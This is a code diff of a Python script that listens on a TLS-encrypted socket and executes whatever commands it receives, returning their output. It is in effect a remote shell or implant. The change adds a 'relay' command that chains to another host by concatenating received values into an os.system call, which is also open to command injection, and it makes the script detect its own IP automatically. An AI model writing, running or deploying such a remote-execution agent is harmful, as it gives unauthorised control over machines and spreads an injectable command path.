@@ -2,9 +2,9 @@ import socket
 import ssl
 import PySimpleGUI as sg
 from subprocess import run
-import sys
+import os
 
-def interact(cert ,key ,host ,port):
+def interact(cert ,key ,host ,port, data="0"):
 
     #Needs cert and key generated:
     #openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -sha256 -days 365
@@ -27,9 +27,16 @@ def interact(cert ,key ,host ,port):
                     print(f"Recieved: {recieve}")
                 recieve=recieve.decode()
                 command_split=recieve.split(" ")
-                command = run(command_split, capture_output=True).stdout
-                conn.send(command)
-def get_host_info(host):
+                if (command_split[0]=="relay"): #Nicely close the encrypted channel
+                    host=command_split[1]
+                    port=command_split[2]
+                    command=command_split[3]
+#                    interact(cert, key, host, port, command)
+                    os.system("python3 test.py -u "+str(host)+" -p "+str(port)+" -c "+str(command))
+                else:
+                    command = run(command_split, capture_output=True).stdout
+                    conn.send(command)
+def get_host_info():
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     s.connect(("8.8.8.8", 80))
     host=(s.getsockname()[0])
@@ -37,11 +44,7 @@ def get_host_info(host):
     return host
 if __name__=="__main__":
     port = 4000
-    host= '192.168.237.129'
     cert="./cert.pem"
     key="./key.pem"
-
+    host=get_host_info()
     interact(cert ,key, host ,port)
-#    setup_list=setup()
-#    host=setup_list[0]
-#    port=setup_list[1]
